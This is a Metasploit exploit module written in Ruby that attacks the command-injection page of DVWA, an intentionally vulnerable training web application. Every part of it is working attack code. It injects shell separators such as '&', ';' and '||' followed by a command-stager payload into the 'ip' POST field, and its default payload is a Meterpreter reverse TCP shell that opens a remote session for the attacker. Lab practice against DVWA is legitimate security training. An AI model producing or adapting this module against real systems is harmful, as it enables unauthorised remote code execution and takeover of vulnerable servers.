class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize
    super(
      'Name'        => 'DVWA Command Injection',
      'Description' => 'DVWA Command Injection Attacker',
      'Author'      => 'huti',
      'License'     => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        =>
        [
          ['linux',  {} ],
          ['windows',{} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Dec 13 2019',
      'DefaultTarget'  => 0,
      'DefaultOptions' => {'Payload' => 'linux/x64/meterpreter/reverse_tcp'}
      )

    register_options([
        Opt::RPORT(80),
        OptString.new('METHOD', [true, 'HTTP Method', 'POST']),
        OptString.new('URIPATH', [ false,  "The path to test command injection", '/vulnerabilities/exec/']),
        OptString.new('COOKIE',[ false, "HTTP Cookies", '']),
      ])
  
    deregister_options('SSL','VHOST','SSLCert','SRVHOST','SRVPORT')
  end

  def execute_command(cmd, opts = {})
	http_method = datastore['METHOD'].upcase
        inject = ['&',';', '|', '-','$','||']
          inject.each do |inject|
	    res = send_request_cgi({
	      'uri'  => normalize_uri(datastore['URIPATH']),
	      'method'  => http_method,
              'ctype' => 'application/x-www-form-urlencoded',
              'cookie' => datastore['COOKIE'],
	      'vars_post' => {'ip' => "#{inject}"+"#{cmd}",
	  		    'Submit' => 'Submit'}
			})
          end
  end

  def exploit
    execute_cmdstager
  end

end


